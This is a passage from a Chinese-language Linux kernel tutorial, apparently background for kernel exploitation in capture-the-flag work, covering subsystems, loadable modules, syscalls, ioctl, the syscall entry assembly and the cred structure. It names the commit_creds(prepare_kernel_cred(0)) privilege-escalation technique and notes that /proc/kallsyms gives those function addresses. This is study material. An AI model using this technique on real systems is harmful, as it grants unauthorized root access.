\uff1a\u8fdb\u7a0b\u7ba1\u7406\u7684\u91cd\u70b9\u662f\u8fdb\u7a0b\u7684\u6267\u884c\u3002\u5728\u5185\u6838\u4e2d\uff0c\u8fd9\u4e9b\u8fdb\u7a0b\u79f0\u4e3a\u7ebf\u7a0b\uff0c\u4ee3\u8868\u4e86\u5355\u72ec\u7684\u5904\u7406\u5668\u865a\u62df\u5316\uff08\u7ebf\u7a0b\u4ee3\u7801\u3001\u6570\u636e\u3001\u5806\u6808\u548cCPU\u5bc4\u5b58\u5668\uff09\u3002\u5728\u7528\u6237\u7a7a\u95f4\uff0c\u901a\u5e38\u4f7f\u7528\u8fdb\u7a0b \u8fd9\u4e2a\u672f\u8bed\uff0c\u4e0d\u8fc7Linux\u5b9e\u73b0\u5e76\u6ca1\u6709\u533a\u5206\u8fd9\u4e24\u4e2a\u6982\u5ff5\uff08\u8fdb\u7a0b\u548c\u7ebf\u7a0b\uff09\u3002\u5185\u6838\u901a\u8fc7SCI\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u6765\u521b\u5efa\u4e00\u4e2a\u65b0\u8fdb\u7a0b\uff0c\u505c\u6b62\u8fdb\u7a0b\uff08kill\u3001exit\uff09\uff0c\u5e76\u5728\u5b83\u4eec\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u548c\u540c\u6b65\uff08signal\u6216\u8005POSIX\u673a\u5236\uff09\u3002\u8fdb\u7a0b\u7ba1\u7406\u8fd8\u5305\u62ec\u5904\u7406\u6d3b\u52a8\u8fdb\u7a0b\u4e4b\u95f4\u5171\u4eabCPU\u7684\u9700\u6c42\u3002\u5185\u6838\u5b9e\u73b0\u4e86\u4e00\u79cd\u65b0\u578b\u7684\u8c03\u5ea6\u7b97\u6cd5\uff0c\u4e0d\u7ba1\u6709\u591a\u5c11\u4e2a\u7ebf\u7a0b\u5728\u7ade\u4e89CPU\uff0c\u8fd9\u79cd\u7b97\u6cd5\u90fd\u53ef\u4ee5\u5728\u56fa\u5b9a\u65f6\u95f4\u5185\u8fdb\u884c\u64cd\u4f5c\u3002\u8c03\u5ea6\u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u652f\u6301\u591a\u5904\u7406\u5668\uff08\u79f0\u4e3a\u5bf9\u79f0\u591a\u5904\u7406\u5668\u6216SMP\uff09\uff1b \u5185\u5b58\u7ba1\u7406 \uff1a\u5982\u679c\u7531\u786c\u4ef6\u7ba1\u7406\u865a\u62df\u5185\u5b58\uff0c\u5185\u5b58\u662f\u6309\u7167\u6240\u8c13\u7684\u5185\u5b58\u9875 \u65b9\u5f0f\u8fdb\u884c\u7ba1\u7406\u7684\uff08\u5bf9\u4e8e\u5927\u90e8\u5206\u4f53\u7cfb\u7ed3\u6784\u6765\u8bf4\u90fd\u662f4KB\uff09\u3002Linux\u5305\u62ec\u4e86\u7ba1\u7406\u53ef\u7528\u5185\u5b58\u7684\u65b9\u5f0f\uff0c\u4ee5\u53ca\u7269\u7406\u548c\u865a\u62df\u6620\u5c04\u6240\u4f7f\u7528\u7684\u786c\u4ef6\u673a\u5236\u3002\u4e0d\u8fc7\u5185\u5b58\u7ba1\u7406\u8981\u7ba1\u7406\u7684\u53ef\u4e0d\u6b624KB\u7f13\u51b2\u533a\u3002Linux\u63d0\u4f9b\u4e86\u5bf94KB\u7f13\u51b2\u533a\u7684\u62bd\u8c61\uff0c\u4f8b\u5982slab\u5206\u914d\u5668\u3002\u8fd9\u79cd\u5185\u5b58\u7ba1\u7406\u6a21\u5f0f\u4f7f\u75284KB\u7f13\u51b2\u533a\u4e3a\u57fa\u6570\uff0c\u7136\u540e\u4ece\u4e2d\u5206\u914d\u7ed3\u6784\uff0c\u5e76\u8ddf\u8e2a\u5185\u5b58\u9875\u4f7f\u7528\u60c5\u51b5\uff0c\u6bd4\u5982\u54ea\u4e9b\u5185\u5b58\u9875\u662f\u6ee1\u7684\uff0c\u54ea\u4e9b\u9875\u9762\u6ca1\u6709\u5b8c\u5168\u4f7f\u7528\uff0c\u54ea\u4e9b\u9875\u9762\u4e3a\u7a7a\u3002\u8fd9\u6837\u5c31\u5141\u8bb8\u8be5\u6a21\u5f0f\u6839\u636e\u7cfb\u7edf\u9700\u8981\u6765\u52a8\u6001\u8c03\u6574\u5185\u5b58\u4f7f\u7528\u3002\u4e3a\u4e86\u652f\u6301\u591a\u4e2a\u7528\u6237\u4f7f\u7528\u5185\u5b58\uff0c\u6709\u65f6\u4f1a\u51fa\u73b0\u53ef\u7528\u5185\u5b58\u88ab\u6d88\u8017\u5149\u7684\u60c5\u51b5\u3002\u7531\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u9875\u9762\u53ef\u4ee5\u79fb\u51fa\u5185\u5b58\u5e76\u653e\u5165\u78c1\u76d8\u4e2d\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4e3a\u4ea4\u6362\uff0c\u56e0\u4e3a\u9875\u9762\u4f1a\u88ab\u4ece\u5185\u5b58\u4ea4\u6362\u5230\u786c\u76d8\u4e0a\u3002Linux\u7cfb\u7edf\u4e2d\uff0c\u88ab\u7528\u4e8e\u4ea4\u6362\u7684\u5206\u533a\u53ebswap\u5206\u533a\uff0c\u5728windows\u7cfb\u7edf\u4e0b\u53eb\u505a\u865a\u62df\u5185\u5b58\uff1b \u6587\u4ef6\u7cfb\u7edf \uff1a\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff08VFS\uff09\u662fLinux\u5185\u6838\u4e2d\u975e\u5e38\u6709\u7528\u7684\u4e00\u4e2a\u65b9\u9762\uff0c\u56e0\u4e3a\u5b83\u4e3a\u6587\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u4e86\u4e00\u4e2a\u901a\u7528\u7684\u63a5\u53e3\u62bd\u8c61\u3002VFS\u5728SCI\u548c\u5185\u6838\u6240\u652f\u6301\u7684\u6587\u4ef6\u7cfb\u7edf\u4e4b\u95f4\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4ea4\u6362\u5c42\u3002\u5728VFS\u4e0a\u9762\uff0c\u662f\u5bf9\u8bf8\u5982open\u3001close\u3001read\u548cwrite\u4e4b\u7c7b\u7684\u51fd\u6570\u7684\u4e00\u4e2a\u901a\u7528API\u62bd\u8c61\u3002\u5728VFS\u4e0b\u9762\u662f\u6587\u4ef6\u7cfb\u7edf\u62bd\u8c61\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e0a\u5c42\u51fd\u6570\u7684\u5b9e\u73b0\u65b9\u5f0f\uff1b \u7f51\u7edc\u7ba1\u7406 \uff1a\u7f51\u7edc\u5806\u6808\u5728\u8bbe\u8ba1\u4e0a\u9075\u5faa\u6a21\u62df\u534f\u8bae\u672c\u8eab\u7684\u5206\u5c42\u4f53\u7cfb\u7ed3\u6784\uff1b \u8bbe\u5907\u9a71\u52a8 \uff1aLinux\u5185\u6838\u4e2d\u6709\u5927\u91cf\u4ee3\u7801\u90fd\u5728\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u4e2d\uff0c\u5b83\u4eec\u80fd\u591f\u8fd0\u8f6c\u7279\u5b9a\u7684\u786c\u4ef6\u8bbe\u5907\u3002Linux\u6e90\u7801\u6811\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9a71\u52a8\u7a0b\u5e8f\u5b50\u76ee\u5f55\uff0c\u8fd9\u4e2a\u76ee\u5f55\u53c8\u8fdb\u4e00\u6b65\u5212\u5206\u4e3a\u5404\u79cd\u652f\u6301\u8bbe\u5907\uff0c\u4f8b\u5982 Bluetooth\u3001I2C\u3001serial\u7b49\u3002 \u53ef\u52a0\u8f7d\u6838\u5fc3\u6a21\u5757 \u53ef\u52a0\u8f7d\u6838\u5fc3\u6a21\u5757\uff08Loadable Kernel Modules\uff0c\u7b80\u79f0LKMs\uff09\u662f\u8fd0\u884c\u5728\u5185\u6838\u7a7a\u95f4\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u5305\u62ec\u9a71\u52a8\u7a0b\u5e8f\uff08\u8bbe\u5907\u9a71\u52a8\u3001\u6587\u4ef6\u7cfb\u7edf\u9a71\u52a8\u7b49\uff09\u3001\u5185\u6838\u6269\u5c55\u6a21\u5757\u3002\u5728Linux\u4e2d\uff0cLKMs\u7684\u6587\u4ef6\u683c\u5f0f\u548cRing3\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u683c\u5f0f\u4e00\u6837\uff0c\u5747\u4e3aELF\u6587\u4ef6\u683c\u5f0f\u3002\u6a21\u5757\u53ef\u4ee5\u88ab\u5355\u72ec\u7f16\u8bd1\uff0c\u4f46\u4e0d\u80fd\u5355\u72ec\u8fd0\u884c\u3002\u5b83\u5728\u8fd0\u884c\u65f6\u88ab\u94fe\u63a5\u5230\u5185\u6838\u4f5c\u4e3a\u5185\u6838\u7684\u4e00\u90e8\u5206\u5728\u5185\u6838\u7a7a\u95f4\u8fd0\u884c\uff0c\u8fd9\u4e0e\u8fd0\u884c\u5728\u7528\u6237\u63a7\u4ef6\u7684\u8fdb\u7a0b\u4e0d\u540c\u3002\u6a21\u5757\u901a\u5e38\u7528\u6765\u5b9e\u73b0\u4e00\u79cd\u6587\u4ef6\u7cfb\u7edf\u3001\u4e00\u4e2a\u9a71\u52a8\u7a0b\u5e8f\u6216\u8005\u5176\u4ed6\u5185\u6838\u4e0a\u5c42\u7684\u529f\u80fd\u3002 \u4f7f\u7528LKMs\u7684\u539f\u56e0\u662f\u56e0\u4e3aLinux\u5185\u6838\u672c\u4e8b\u662f\u4e00\u4e2a\u5355\u5185\u6838\uff0c\u6548\u7387\u9ad8\uff0c\u56e0\u4e3a\u6240\u6709\u7684\u5185\u5bb9\u90fd\u96c6\u5408\u5728\u4e00\u8d77\uff0c\u4f46\u662f\u7f3a\u5c11\u53ef\u6269\u5c55\u884c\u548c\u53ef\u7ef4\u62a4\u6027\uff0c\u56e0\u6b64\u9700\u8981\u4f7f\u7528LKMs\u3002\u5927\u90e8\u5206\u7684\u5185\u6838\u9898\u76ee\u57fa\u672c\u90fd\u662f\u4f1a\u5904\u5728LKM\u4e2d\u3002 \u4e0b\u8868\u4e2d\u7ed9\u51fa\u4e86linux\u4e2d\u5e38\u89c1\u7684LKMs\u7684\u64cd\u4f5c\u6307\u4ee4\uff1a \u6307\u4ee4 \u63cf\u8ff0 insmod \u52a0\u8f7d\u6a21\u5757\u5230\u5185\u6838\u4e2d rmmod \u5728\u5185\u6838\u4e2d\u5378\u8f7d\u6a21\u5757 lsmod \u679a\u4e3e\u7cfb\u7edf\u4e2d\u5df2\u7ecf\u52a0\u8f7d\u7684\u6a21\u5757 \u7cfb\u7edf\u8c03\u7528 \u7cfb\u7edf\u8c03\u7528\uff08syscall\uff09\u6307\u7528\u6237\u6001\u8fd0\u884c\u7684\u7a0b\u5e8f\u5411\u5185\u6838\u8bf7\u6c42\u9ad8\u6743\u9650\u7684\u670d\u52a1\uff0c\u5176\u672c\u8d28\u662f\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u7684\u63a5\u53e3\u3002\u5f88\u591a\u5e93\u51fd\u6570\uff0c\u6bd4\u5982scanf\u3001puts\u7b49IO\u76f8\u5173\u51fd\u6570\u90fd\u662f\u5bf9\u7cfb\u7edf\u8c03\u7528\u7684\u5c01\u88c5\u3002 man\u624b\u518c\u4e2d\u7684ioctl\uff1a Name ioctl - control device Synopsis #include sys/ioctl.h int ioctl(int d, int request, ...); Description The ioctl() function manipulates the underlying device parameters of special files. In particular, many operating characteristics of character special files (e.g., terminals) may be controlled with ioctl() requests. The argument d must be an open file descriptor. The second argument is a device-dependent request code. The third argument is an untyped pointer to memory. It s traditionally char *argp (from the days before void * was valid C), and will be so named for this discussion. An ioctl() request has encoded in it whether the argument is an in parameter or out parameter, and the size of the argument argp in bytes. Macros and defines used in specifying an ioctl() request are located in the file sys/ioctl.h . Return Value Usually, on success zero is returned. A few ioctl() requests use the return value as an output parameter and return a nonnegative value on success. On error, -1 is returned, and errno is set appropriately. ioctl\u662f\u4e00\u4e2a\u7528\u4e8e\u548c\u8bbe\u5907\u901a\u4fe1\u7684\u7cfb\u7edf\u8c03\u7528\u3002int ioctl(int fd, unsigned long request, ...)\u4e2d\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u6253\u5f00\u8bbe\u5907\u8fd4\u56de\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u7528\u6237\u7a0b\u5e8f\u5bf9\u8bbe\u5907\u7684\u63a7\u5236\u6307\u4ee4\uff0c\u540e\u9762\u7684\u53c2\u6570\u662f\u8865\u5145\u53c2\u6570\uff0c\u548c\u8bbe\u5907\u672c\u8eab\u76f8\u5173\u3002 Linux\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86\u5185\u6838\u8bbf\u95ee\u6807\u51c6\u5916\u90e8\u8bbe\u5907\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u6bd4\u5982IO\u3002\u5f53\u8bbf\u95ee\u975e\u6807\u51c6\u7684\u786c\u4ef6\u8bbe\u5907\u65f6\u56e0\u4e3a\u8fc7\u5206\u590d\u6742\u7684\u60c5\u51b5\uff0c\u662f\u5f88\u96be\u53bb\u63d0\u4f9b\u5145\u8db3\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u3002\u56e0\u6b64\u5185\u6838\u88ab\u8bbe\u8ba1\u4e3a\u53ef\u6269\u5c55\u7684\uff0c\u53ef\u4ee5\u52a0\u5165\u8bbe\u5907\u9a71\u52a8\u6a21\u5757\uff0c\u9a71\u52a8\u4ee3\u7801\u5141\u8bb8\u5728\u5185\u6838\u7a7a\u95f4\u8fd0\u884c\u5e76\u4e14\u53ef\u4ee5\u5bf9\u8bbe\u5907\u76f4\u63a5\u5bfb\u5740\u3002\u4e00\u4e2aioctl\u63a5\u53e3\u5c31\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u7528\u6237\u6001\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u76f4\u63a5\u8ddf\u8bbe\u5907\u6c9f\u901a\uff0c\u5bf9\u8bbe\u5907\u9a71\u52a8\u7684\u8bf7\u6c42\u662f\u4e00\u4e2a\u4ee5\u8bbe\u5907\u548c\u8bf7\u6c42\u53f7\u7801\u4e3a\u53c2\u6570\u7684ioctl\u8c03\u7528\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u8be6\u7ec6\u4ecb\u7ecd\u4e00\u4e0b\u7cfb\u7edf\u8c03\u7528\u7684\u6d41\u7a0b\u3002Int $0x80\u6307\u4ee4\u7684\u76ee\u7684\u662f\u4ea7\u751f\u4e00\u4e2a\u7f16\u53f7\u4e3a128\u7684\u7f16\u7a0b\u5f02\u5e38\uff0c\u8fd9\u4e2a\u7f16\u7a0b\u5f02\u5e38\u5bf9\u5e94\u7684\u662f\u4e2d\u65ad\u63cf\u8ff0\u7b26\u8868IDT\u4e2d\u7684\u7b2c128\u9879\u2014\u2014\u4e5f\u5c31\u662f\u5bf9\u5e94\u7684\u7cfb\u7edf\u95e8\u63cf\u8ff0\u7b26\u3002\u95e8\u63cf\u8ff0\u7b26\u4e2d\u542b\u6709\u4e00\u4e2a\u9884\u8bbe\u7684\u5185\u6838\u7a7a\u95f4\u5730\u5740\uff0c\u5b83\u6307\u5411\u4e86\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f\uff1asystem_call()\u3002Linux\u4e3a\u6bcf\u4e2a\u7cfb\u7edf\u8c03\u7528\u90fd\u8fdb\u884c\u4e86\u7f16\u53f7\uff080\u2014NR_syscall\uff09\uff0c\u540c\u65f6\u5728\u5185\u6838\u4e2d\u4fdd\u5b58\u4e86\u4e00\u5f20\u7cfb\u7edf\u8c03\u7528\u8868\uff0c\u8be5\u8868\u4e2d\u4fdd\u5b58\u4e86\u7cfb\u7edf\u8c03\u7528\u7f16\u53f7\u548c\u5176\u5bf9\u5e94\u7684\u670d\u52a1\u4f8b\u7a0b\uff0c\u56e0\u6b64\u5728\u7cfb\u7edf\u8c03\u5165\u901a\u8fc7\u7cfb\u7edf\u95e8\u9677\u5165\u5185\u6838\u524d\uff0c\u9700\u8981\u628a\u7cfb\u7edf\u8c03\u7528\u53f7\u4e00\u5e76\u4f20\u5165\u5185\u6838\uff0c\u5728x86\u4e0a\uff0c\u8fd9\u4e2a\u4f20\u9012\u52a8\u4f5c\u662f\u901a\u8fc7\u5728\u6267\u884cint0x80\u524d\u628a\u8c03\u7528\u53f7\u88c5\u5165eax\u5bc4\u5b58\u5668\u5b9e\u73b0\u7684\u3002\u8fd9\u6837\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f\u4e00\u65e6\u8fd0\u884c\uff0c\u5c31\u53ef\u4ee5\u4eceeax\u4e2d\u5f97\u5230\u6570\u636e\uff0c\u7136\u540e\u518d\u53bb\u7cfb\u7edf\u8c03\u7528\u8868\u4e2d\u5bfb\u627e\u76f8\u5e94\u670d\u52a1\u4f8b\u7a0b\u4e86\u3002\u9664\u4e86\u9700\u8981\u4f20\u9012\u7cfb\u7edf\u8c03\u7528\u53f7\u4ee5\u5916\uff0c\u8bb8\u591a\u7cfb\u7edf\u8c03\u7528\u8fd8\u9700\u8981\u4f20\u9012\u4e00\u4e9b\u53c2\u6570\u5230\u5185\u6838\uff0c\u6bd4\u5982sys_write(unsigned int fd, const char * buf, size_t count)\u8c03\u7528\u5c31\u9700\u8981\u4f20\u9012\u6587\u4ef6\u63cf\u8ff0\u7b26fd\u3001\u8981\u5199\u5165\u7684\u5185\u5bb9buf\u3001\u4ee5\u53ca\u5199\u5165\u5b57\u8282\u6570count\u7b49\u51e0\u4e2a\u5185\u5bb9\u5230\u5185\u6838\u3002\u78b0\u5230\u8fd9\u79cd\u60c5\u51b5\uff0cLinux\u4f1a\u67096\u4e2a\u5bc4\u5b58\u5668\u53ef\u88ab\u7528\u6765\u4f20\u9012\u8fd9\u4e9b\u53c2\u6570\uff1aeax(\u5b58\u653e\u7cfb\u7edf\u8c03\u7528\u53f7)\u3001ebx\u3001ecx\u3001edx\u3001esi\u53caedi\u6765\u5b58\u653e\u8fd9\u4e9b\u989d\u5916\u7684\u53c2\u6570\u3002\u5f53\u670d\u52a1\u4f8b\u7a0b\u7ed3\u675f\u65f6\uff0csystem_call()\u4eceeax\u83b7\u5f97\u7cfb\u7edf\u8c03\u7528\u7684\u8fd4\u56de\u503c\uff0c\u5e76\u628a\u8fd9\u4e2a\u8fd4\u56de\u503c\u5b58\u653e\u5728\u66fe\u4fdd\u5b58\u7528\u6237\u6001 eax\u5bc4\u5b58\u5668\u6808\u5355\u5143\u7684\u90a3\u4e2a\u4f4d\u7f6e\u4e0a\u3002\u7136\u540e\u8df3\u8f6c\u5230ret_from_sys_call()\uff0c\u7ec8\u6b62\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f\u7684\u6267\u884c\u3002\u5f53\u8fdb\u7a0b\u6062\u590d\u5b83\u5728\u7528\u6237\u6001\u7684\u6267\u884c\u524d\uff0cRESTORE_ALL\u5b8f\u4f1a\u6062\u590d\u7528\u6237\u8fdb\u5165\u5185\u6838\u524d\u88ab\u4fdd\u7559\u5230\u5806\u6808\u4e2d\u7684\u5bc4\u5b58\u5668\u503c\u3002\u5176\u4e2deax\u8fd4\u56de\u65f6\u4f1a\u5e26\u56de\u7cfb\u7edf\u8c03\u7528\u7684\u8fd4\u56de\u7801\u3002\uff08\u8d1f\u6570\u8bf4\u660e\u8c03\u7528\u9519\u8bef\uff0c0\u6216\u6b63\u6570\u8bf4\u660e\u6b63\u5e38\u5b8c\u6210\uff09 \u5185\u6838\u5207\u6362\u673a\u5236 CPU\u4ece\u7528\u6237\u6001\u5207\u6362\u5230\u5185\u6838\u6001\u7684\u6761\u4ef6\u662f\u53d1\u751f\u7cfb\u7edf\u8c03\u7528\u3001\u5f02\u5e38\u3001\u5916\u8bbe\u4e2d\u65ad\u7b49\u4e8b\u4ef6\uff0c\u5177\u4f53\u8fc7\u7a0b\u53ef\u4ee5\u53c2\u8003\u5982\u4e0b\u4ee3\u7801\uff1a ENTRY ( entry_SYSCALL_64 ) SWAPGS_UNSAFE_STACK GLOBAL ( entry_SYSCALL_64_after_swapgs ) movq % rsp , PER_CPU_VAR ( rsp_scratch ) movq PER_CPU_VAR ( cpu_current_top_of_stack ), % rsp TRACE_IRQS_OFF /* Construct struct pt_regs on stack */ pushq $ __USER_DS /* pt_regs- ss */ pushq PER_CPU_VAR ( rsp_scratch ) /* pt_regs- sp */ pushq % r11 /* pt_regs- flags */ pushq $ __USER_CS /* pt_regs- cs */ pushq % rcx /* pt_regs- ip */ pushq % rax /* pt_regs- orig_ax */ pushq % rdi /* pt_regs- di */ pushq % rsi /* pt_regs- si */ pushq % rdx /* pt_regs- dx */ pushq % rcx /* pt_regs- cx */ pushq $ - ENOSYS /* pt_regs- ax */ pushq % r8 /* pt_regs- r8 */ pushq % r9 /* pt_regs- r9 */ pushq % r10 /* pt_regs- r10 */ pushq % r11 /* pt_regs- r11 */ sub $ ( 6 * 8 ), % rsp /* pt_regs- bp, bx, r12-15 not saved */ \u901a\u8fc7\u4ee3\u7801\u53ef\u4ee5\u5206\u6790\u51fa\u7528\u6237\u6001\u5207\u6362\u5230\u5185\u6838\u6001\u65f6\u505a\u4e86\u54ea\u4e9b\u4e8b\u60c5\uff08entry_SYSCALL_64\uff09\uff1a \u6267\u884c\u4e86swapgs\u6307\u4ee4\uff0c\u4ea4\u6362GS\u5bc4\u5b58\u5668\u503c\u548c\u7279\u5b9a\u4f4d\u7f6e\u7684\u5185\u6838\u6267\u884c\u65f6\u7684GS\u503c\uff1b \u5c06\u7528\u6237\u7a7a\u95f4\u6808\u9876\u8bb0\u5f55\u5728CPU\u72ec\u5360\u53d8\u91cf\u533a\u57df\u4e2d\uff0c\u5c06CPU\u72ec\u5360\u533a\u57df\u4e2d\u8bb0\u5f55\u7684\u5185\u6838\u6808\u9876\u653e\u5165rsp/esp\uff1b \u901a\u8fc7push\u4fdd\u5b58\u5404\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f62\u6210\u4e86\u4e00\u4e2apt_regs\u7ed3\u6784\uff1b \u5224\u65ad\u662f\u5426\u4e3ax32_abi\uff1b \u6839\u636e\u7cfb\u7edf\u8c03\u7528\u53f7\u8df3\u5230\u5168\u5c40\u53d8\u91cfsys_call_table\u76f8\u5e94\u4f4d\u7f6e\u7ee7\u7eed\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u3002CPU\u4ece\u5185\u6838\u6001\u56de\u590d\u5230\u7528\u6237\u6001\u65f6\u4f1a\u6267\u884c\uff1a \u901a\u8fc7swapgs\u6062\u590dGS\u503c\uff1b \u901a\u8fc7sysretq\u6216\u8005iretq\u6062\u590d\u7528\u6237\u6001\u7684\u5bc4\u5b58\u5668\u4fe1\u606f\u3002 cred\u7ed3\u6784\u4f53 Kernel\u8bb0\u5f55\u4e86\u8fdb\u7a0b\u7684\u6743\u9650\u7b49\u76f8\u5173\u4fe1\u606f\uff0c\u4f7f\u7528\u5c31\u662fcred\u7ed3\u6784\u4f53\u3002\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u4f1a\u6709\u4e00\u4e2acred\u7ed3\u6784\u4e0e\u5176\u5bf9\u5e94\uff0c\u7ed3\u6784\u4e2d\u5b58\u50a8\u4e86\u8be5\u8fdb\u7a0b\u6743\u9650\u7b49\u4fe1\u606f\uff0c\u4f8b\u5982uid\u3001gid\uff0c\u5982\u679c\u80fd\u591f\u4fee\u6539\u67d0\u4e2a\u8fdb\u7a0b\u7684cred\uff0c\u4e5f\u5c31\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u8fdb\u7a0b\u7684\u6743\u9650\u7684\u4fee\u6539\u3002Cred\u7ed3\u6784\u4f53\u5982\u4e0b\u6240\u793a\uff1a struct cred { atomic_t usage ; #ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers ; /* number of processes subscribed */ void * put_addr ; unsigned magic ; #define CRED_MAGIC 0x43736564 #define CRED_MAGIC_DEAD 0x44656144 #endif kuid_t uid ; /* real UID of the task */ kgid_t gid ; /* real GID of the task */ kuid_t suid ; /* saved UID of the task */ kgid_t sgid ; /* saved GID of the task */ kuid_t euid ; /* effective UID of the task */ kgid_t egid ; /* effective GID of the task */ kuid_t fsuid ; /* UID for VFS ops */ kgid_t fsgid ; /* GID for VFS ops */ unsigned securebits ; /* SUID-less security management */ kernel_cap_t cap_inheritable ; /* caps our children can inherit */ kernel_cap_t cap_permitted ; /* caps we re permitted */ kernel_cap_t cap_effective ; /* caps we can actually use */ kernel_cap_t cap_bset ; /* capability bounding set */ kernel_cap_t cap_ambient ; /* Ambient capability set */ #ifdef CONFIG_KEYS unsigned char jit_keyring ; /* default keyring to attach requested * keys to */ struct key __rcu * session_keyring ; /* keyring inherited over fork */ struct key * process_keyring ; /* keyring private to this process */ struct key * thread_keyring ; /* keyring private to this thread */ struct key * request_key_auth ; /* assumed request_key authority */ #endif #ifdef CONFIG_SECURITY void * security ; /* subjective LSM security */ #endif struct user_struct * user ; /* real user ID subscription */ struct user_namespace * user_ns ; /* user_ns the caps and keyrings are relative to. */ struct group_info * group_info ; /* supplementary groups for euid/fsgid */ struct rcu_head rcu ; /* RCU deletion hook */ } __randomize_layout ; \u5185\u6838\u6001\u51fd\u6570\u548c\u7b26\u53f7 \u4ecb\u7ecd\u4e0bLinux\u5185\u6838\u4e2d\u7684\u91cd\u8981\u51fd\u6570\u3002 printk()\uff1a\u5185\u6838\u6001\u7684\u6253\u5370\u51fd\u6570\uff0c\u4f46\u662f\u8f93\u51fa\u4e0d\u662f\u7ec8\u7aef\uff0c\u800c\u662f\u5185\u6838\u7f13\u51b2\u533a\uff0c\u53ef\u4ee5\u901a\u8fc7dmesg\u67e5\u770b\u3002 copy_from_user()/copy_to_user()\uff1a\u5185\u6838\u6001\u548c\u7528\u6237\u6001\u6570\u636e\u4f20\u8f93\u7684\u51fd\u6570\uff0c\u524d\u8005\u5b9e\u73b0\u4e86\u7528\u6237\u6001\u6570\u636e\u5411\u5185\u6838\u6001\u7684\u4f20\u8f93\uff0c\u540e\u8005\u5b9e\u73b0\u4e86\u5185\u6838\u6001\u6570\u636e\u5411\u7528\u6237\u6001\u4f20\u8f93\u3002 kmalloc()\uff1a\u5185\u6838\u6001\u7684\u5185\u5b58\u5206\u914d\u51fd\u6570\uff0c\u4f7f\u7528\u7684\u662fslab/slub\u5206\u914d\u5668\u3002 commit_creds(struct cred *new)\uff1a\u5c06\u65b0\u7684cred\u7ed3\u6784\u5e94\u7528\u4e8e\u5f53\u524d\u8fdb\u7a0b\uff1b struct cred* prepare_kernel_cred(struct task_struct* daemon)\uff1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684cred\u7ed3\u6784\u3002 \u901a\u5e38\u6765\u8bf4\u5982\u679c\u53ef\u4ee5\u5728\u5185\u6838\u4e2d\u6267\u884ccommit_creds(prepare_kernel_cred(0))\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6e\u5f53\u524d\u8fdb\u7a0b\u7684uid\u548cgid\u4e3a0\uff0c\u5b9e\u73b0\u672c\u5730\u63d0\u6743\u3002 \u5982\u4e0b\u56fe\uff0c\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b/proc/kallsyms\u6765\u83b7\u53d6\u4e24\u4e2a\u51fd\u6570\u7684\u5730\u5740\u3002 \u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e0b\u5185\u6838\u7b26\u53f7\u8868\u3002Linux\u5185\u6838\u662f\u4e2a\u6574\u4f53\u7ed3\u6784\uff0c\u6a21\u5757\u662f\u63ba\u5165\u5176\u4e2d\u7684\u63d2\u4ef6\u3002\u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u628a\u5185\u6838\u6574\u4f53\u770b\u505a\u4e00\u4e2a\u5927\u6a21\u5757\u3002\u90a3\u4e48\u6a21\u5757\u548c\u6a21\u5757\u4e4b\u95f4\u4ea4\u4e92\u4e00\u79cd\u5e38\u7528\u7684\u65b9\u6cd5\u5c31\u662f\u5171\u4eab\u53d8\u91cf\u548c\u51fd\u6570\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u6a21\u5757\u4e2d\u7684\u6bcf\u4e2a\u53d8\u91cf\u548c\u51fd\u6570\u90fd\u80fd\u88ab\u5171\u4eab\uff0c\u5185\u6838\u4e2d\u53ea\u628a\u5404\u4e2a\u6a21\u5757\u4e2d\u4e3b\u8981\u7684\u53d8\u91cf\u548c\u51fd\u6570\u653e\u5728\u4e00\u4e2a\u7279\u5b9a\u7684\u533a\u6bb5\uff0c\u8fd9\u4e9b\u53d8\u91cf\u548c\u51fd\u6570\u5c31\u79f0\u4e3a\u7b26\u53f7\u3002\u5728kernel/ksyms.c\u4e2d\u5b9a\u4e49\u4e86\u53ef\u4ee5\u4ece\u5185\u6838\u8fd9\u4e2a\u7279\u6b8a\u7684\u201c\u6a21\u5757\u201d\u4e2d\u53ef\u4ee5export\u7684\u7b26\u53f7\uff0c\u4f8b\u5982\u8fdb\u7a0b\u7ba1\u7406\u5b50\u7cfb\u7edf\uff0c\u90a3\u4e48\u53ef\u4ee5export\u7684\u7b26\u53f7\u5982\u4e0b\uff1a /*\u8fdb\u7a0b\u7ba1\u7406 */ EXPORT_SYMBOL ( do_mmap_pgoff ); EXPORT_SYMBOL ( do_munmap ); EXPORT_SYMBOL 